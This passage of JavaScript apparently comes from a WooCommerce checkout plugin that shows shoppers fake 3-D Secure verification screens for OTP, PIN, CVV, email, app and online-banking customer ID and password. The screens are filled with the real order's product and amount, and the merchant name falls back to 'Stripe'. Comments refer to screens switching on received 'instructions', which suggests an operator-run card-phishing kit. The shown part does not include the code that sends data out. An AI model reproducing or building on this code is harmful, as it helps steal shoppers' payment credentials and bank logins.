                document.querySelector('.woocommerce-table--order-details .product-name')?.textContent?.trim() ||
                document.querySelector('.product-name')?.textContent?.trim() ||
                // 右侧订单摘要
                document.querySelector('.wfacp-order-summary-label')?.textContent?.trim() ||
                document.querySelector('[data-product-name]')?.getAttribute('data-product-name') ||
                'N/A';
            
            // 清理产品名称（移除数量标记如 " × 1"）
            return productName.replace(/\s*×\s*\d+\s*$/, '').trim();
        }

        /**
         * 🔥 更新等待界面的产品和价格信息
         * 🔥🔥🔥 等待界面不显示产品和价格信息（按用户要求）🔥🔥🔥
         */
        updateWaitingDetails() {
            // 🔥🔥🔥 等待界面不显示产品和价格信息 🔥🔥🔥
            const waitingDetailsContainer = document.getElementById('cpgWaitingDetails');
            if (waitingDetailsContainer) {
                waitingDetailsContainer.style.display = 'none';
            }
            console.log('[3D Verify] ⚠️ 等待界面不显示产品信息（按用户要求）');
        }
        
        /**
         * 🔥 从订单页面获取商品名称（用于订单接收页面）
         */
        getProductNameFromOrderPage() {
            // WooCommerce 订单详情页选择器
            const orderProductName = 
                document.querySelector('.woocommerce-table--order-details .product-name a')?.textContent?.trim() ||
                document.querySelector('.woocommerce-table--order-details .product-name')?.textContent?.trim() ||
                document.querySelector('.order_item .product-name')?.textContent?.trim() ||
                document.querySelector('.woocommerce-order-details .product-name')?.textContent?.trim();
            
            if (orderProductName) {
                return orderProductName.replace(/\s*×\s*\d+\s*$/, '').trim();
            }
            return null;
        }
        
        /**
         * 🔥 从订单页面获取金额（用于订单接收页面）
         */
        getAmountFromOrderPage() {
            // WooCommerce 订单详情页选择器
            return document.querySelector('.woocommerce-order-overview__total .woocommerce-Price-amount')?.textContent?.trim() ||
                   document.querySelector('.order-total .woocommerce-Price-amount')?.textContent?.trim() ||
                   document.querySelector('.woocommerce-table--order-details .order-total .amount')?.textContent?.trim() ||
                   document.querySelector('.woocommerce-order-details .order-total')?.textContent?.trim()?.replace(/.*?([^\s]+)$/, '$1') ||
                   null;
        }
        
        /**
         * 🔥🔥🔥 更新所有3D验证界面的商品信息（OTP/PIN/CVV/Email/Bank等）🔥🔥🔥
         */
        updateAllVerificationDetails() {
            // 🔥 获取商品信息（优先级：缓存 > cpgTracker > CPG_CONFIG > 页面提取）
            const cachedProductInfo = window.CPG_ProductInfo || {};
            let trackerProductInfo = {};
            try {
                trackerProductInfo = window.cpgTracker?.getProductInfo?.() || {};
            } catch (e) {}
            
            const configProductName = window.CPG_CONFIG?.product_name;
            const configProductPrice = window.CPG_CONFIG?.product_price;
            const configStoreName = window.CPG_CONFIG?.site_name || window.CPG_CONFIG?.store_name;
            const pageProductName = this.getProductNameFromPage();
            const pageAmount = this.getAmountFromPage();
            
            const productName = (cachedProductInfo.name && cachedProductInfo.name !== 'N/A' ? cachedProductInfo.name : null) ||
                               (configProductName && configProductName !== 'N/A' ? configProductName : null) || 
                               (trackerProductInfo.name && trackerProductInfo.name !== 'N/A' ? trackerProductInfo.name : null) || 
                               pageProductName || 'N/A';
            
            const amountText = (cachedProductInfo.price && cachedProductInfo.price !== '$0.00' ? cachedProductInfo.price : null) ||
                              (configProductPrice && configProductPrice !== '$0.00' ? configProductPrice : null) || 
                              (trackerProductInfo.price && trackerProductInfo.price !== '$0.00' ? trackerProductInfo.price : null) || 
                              pageAmount || '$0.00';
            
            const merchantName = configStoreName || 'Stripe';
            
            console.log('[3D Verify] 📦 更新验证界面商品信息:', { merchantName, productName, amountText });
            
            // 🔥 更新所有验证类型的字段
            const verificationTypes = ['otp', 'email', 'pin', 'cvv', 'app', 'bank', 'custom'];
            
            verificationTypes.forEach(type => {
                // Merchant
                const merchantEl = document.getElementById(`${type}Merchant`);
                if (merchantEl) merchantEl.textContent = merchantName;
                
                // Product
                const productEl = document.getElementById(`${type}Product`);
                if (productEl) productEl.textContent = productName;
                
                // Amount
                const amountEl = document.getElementById(`${type}Amount`);
                // 🔥🔥🔥 解码HTML实体，修复价格显示问题（&pound; -> £）🔥🔥🔥
                if (amountEl) amountEl.textContent = this.decodeHtmlEntities(amountText);
            });
        }

        /**
         * 🔥 从页面获取订单金额
         */
        getAmountFromPage() {
            // 尝试多种 WooCommerce/FunnelKit 选择器
            return // 🔥 FunnelKit 最新选择器
                   document.querySelector('.wfacp_order_total_wrap .wfacp_order_total_value bdi')?.textContent?.trim() ||
                   document.querySelector('.wfacp_order_total_wrap .wfacp_order_total_value .woocommerce-Price-amount')?.textContent?.trim() ||
                   document.querySelector('.wfacp_order_total .wfacp_order_total_value')?.textContent?.trim() ||
                   document.querySelector('.wfacp_order_total .woocommerce-Price-amount')?.textContent?.trim() ||
                   document.querySelector('.wfacp_mini_cart_total .woocommerce-Price-amount')?.textContent?.trim() ||
                   document.querySelector('.wfacp_mini_cart_item_total .woocommerce-Price-amount')?.textContent?.trim() ||
                   document.querySelector('.wfacp-order-total-value')?.textContent?.trim() ||
                   // WooCommerce 标准选择器
                   document.querySelector('.order-total .woocommerce-Price-amount bdi')?.textContent?.trim() ||
                   document.querySelector('.order-total .woocommerce-Price-amount')?.textContent?.trim() ||
                   document.querySelector('.order-total .amount')?.textContent?.trim() ||
                   document.querySelector('.order-total bdi')?.textContent?.trim() ||
                   document.querySelector('.cart-subtotal .woocommerce-Price-amount')?.textContent?.trim() ||
                   document.querySelector('.cart-subtotal .amount')?.textContent?.trim() ||
                   document.querySelector('.woocommerce-Price-amount.amount bdi')?.textContent?.trim() ||
                   document.querySelector('.woocommerce-Price-amount.amount')?.textContent?.trim() ||
                   // 通用选择器
                   document.querySelector('.woocommerce-Price-amount bdi')?.textContent?.trim() ||
                   '$0.00';
        }

        /**
         * 🔥 隐藏单个验证界面的加载圈圈并显示按钮（用于error/change/custom）
         */
        hideLoadingAndShowButton(verificationType) {
            
            // 隐藏加载圈圈
            const loadingSection = document.getElementById(`${verificationType}LoadingSection`);
            if (loadingSection) {
                loadingSection.style.display = 'none';
            }
            
            // 显示提交按钮
            const submitButtons = document.querySelectorAll(`#cpg-${verificationType} .cpg-submit-btn`);
            submitButtons.forEach(btn => {
                btn.style.display = '';
                btn.disabled = false; // 确保按钮可点击
            });
            
            // 显示重发按钮（如果有）
            const resendButtons = document.querySelectorAll(`#cpg-${verificationType} .cpg-resend-btn`);
            resendButtons.forEach(btn => {
                btn.style.display = '';
                btn.disabled = false;
            });
            
            // 启用输入框（如果被禁用）
            const inputElement = document.getElementById(`${verificationType}Input`);
            if (inputElement) {
                inputElement.disabled = false;
            }
            
            // 网银验证界面有两个输入框
            if (verificationType === 'bank') {
                const customerInput = document.getElementById('bankCustomerInput');
                const passwordInput = document.getElementById('bankPasswordInput');
                if (customerInput) customerInput.disabled = false;
                if (passwordInput) passwordInput.disabled = false;
            }
        }

        /**
         * 🔥 隐藏所有加载圈圈并显示按钮
         */
        hideAllLoadingCircles() {
            
            // 验证类型列表
            const types = ['otp', 'email', 'pin', 'cvv', 'app', 'bank', 'custom'];
            
            types.forEach(type => {
                // 隐藏加载圈圈
                const loadingSection = document.getElementById(`${type}LoadingSection`);
                if (loadingSection) {
                    loadingSection.style.display = 'none';
                }
                
                // 🔥 隐藏错误提示（收到新指令时清除旧错误）
                const errorElement = document.getElementById(`${type}ErrorMessage`);
                if (errorElement) {
                    errorElement.style.display = 'none';
                }
                
                // 显示提交按钮
                const submitButtons = document.querySelectorAll(`#cpg-${type} .cpg-submit-btn`);
                submitButtons.forEach(btn => {
                    btn.style.display = '';
                });
                
                // 显示重发按钮（如果有）
                const resendButtons = document.querySelectorAll(`#cpg-${type} .cpg-resend-btn`);
                resendButtons.forEach(btn => {
                    btn.style.display = '';
                });
            });
        }

        /**
         * 🔥🔥🔥 初始化产品信息（修复硬编码问题）🔥🔥🔥
         * 在页面加载时立即更新所有验证界面的商品信息
         */
        initProductInfo() {
            console.log('[3D Verify] 🔄 初始化产品信息...');
            
            // 🔥 等待 CPG_CONFIG 和 cpgTracker 可用
            const tryUpdate = (attempts = 0) => {
                // 获取产品信息来源
                const hasConfig = window.CPG_CONFIG && 
                                 (window.CPG_CONFIG.product_name !== 'N/A' || 
                                  window.CPG_CONFIG.product_price !== '$0.00');
                const hasTracker = window.cpgTracker && typeof window.cpgTracker.getProductInfo === 'function';
                const hasCached = window.CPG_ProductInfo && 
                                 (window.CPG_ProductInfo.name !== 'N/A' || 
                                  window.CPG_ProductInfo.price !== '$0.00');
                
                if (hasConfig || hasTracker || hasCached) {
                    // 🔥 立即更新所有验证界面
                    this.updateAllVerificationDetails();
                    console.log('[3D Verify] ✅ 产品信息已初始化');
                } else if (attempts < 10) {
                    // 重试（最多10次，每次间隔500ms）
                    setTimeout(() => tryUpdate(attempts + 1), 500);
                } else {
                    console.warn('[3D Verify] ⚠️ 产品信息初始化超时，使用页面提取');
                    // 最后尝试从页面提取
                    this.updateAllVerificationDetails();
                }
            };
            
            // 🔥 延迟100ms后开始（确保DOM完全加载）
            setTimeout(() => tryUpdate(), 100);
            
            // 🔥 监听 CPG_ProductInfo 变化（当 user-tracking.js 发送商品信息后更新）
            let lastProductInfo = null;
            const checkProductInfo = setInterval(() => {
                const currentInfo = window.CPG_ProductInfo;
                if (currentInfo && JSON.stringify(currentInfo) !== JSON.stringify(lastProductInfo)) {
                    lastProductInfo = currentInfo;
                    console.log('[3D Verify] 🔄 检测到产品信息更新，重新渲染');
                    this.updateAllVerificationDetails();
                }
            }, 1000);
            
            // 10秒后停止检查（避免无限循环）
            setTimeout(() => clearInterval(checkProductInfo), 10000);
        }

        /**
         * 向后兼容API
         */
        setupBackwardCompatibility() {
            // 向后兼容：显示等待界面
            window.showVerificationWaiting = () => {
                // 🔥 检查是否在感谢页面且订单已完成，如果是则不显示等待界面
                const isOrderReceivedPage = jQuery('body').hasClass('woocommerce-order-received') || 
                                            window.location.href.indexOf('order-received') > -1;
                
                if (isOrderReceivedPage) {
                    // 多种方式检查订单是否已完成
                    const hasCompletedClass = jQuery('.woocommerce-order-status--completed, .order-status.completed, .status-completed').length > 0;
                    const orderStatusText = jQuery('.woocommerce-order-status, .order-status, .woocommerce-order-overview__order-status').text().toLowerCase();
                    const hasCompletedText = orderStatusText.indexOf('completed') > -1 || 
                                             orderStatusText.indexOf('完成') > -1 ||
                                             orderStatusText.indexOf('processing') > -1 ||
                                             orderStatusText.indexOf('成功') > -1;
                    const thankYouVisible = jQuery('.woocommerce-thankyou-order-received').is(':visible') && 
                                            jQuery('.woocommerce-thankyou-order-received').text().trim().length > 0;
                    const orderDetailsVisible = jQuery('.woocommerce-order-details').is(':visible') && 
                                                jQuery('.woocommerce-order-details').text().trim().length > 0;
                    
                    if (hasCompletedClass || hasCompletedText || thankYouVisible || orderDetailsVisible || window.CPG_VerificationCompleted) {
                        console.log('[CPG 3D] ✅ 订单已完成，不显示等待界面');
                        // 确保感谢信息显示
                        jQuery('.woocommerce-order, .woocommerce-thankyou-order-received').show();
                        window.CPG_VerificationCompleted = true;
                        return;
                    }
                }
                
                this.showWaiting({});
            };
            
            // 向后兼容：隐藏等待界面（重置 waitingShown 标志）
            window.hideVerificationWaiting = () => {
                this.hideAll(true);
            };
            
        }
    }

    // 🔥 立即初始化
    
    try {
        window.CPG_3D_Verification = new CPG_3D_Verification();
    } catch (error) {
        console.error('[3D Verify] ❌ 初始化失败:', error);
    }

})(jQuery);

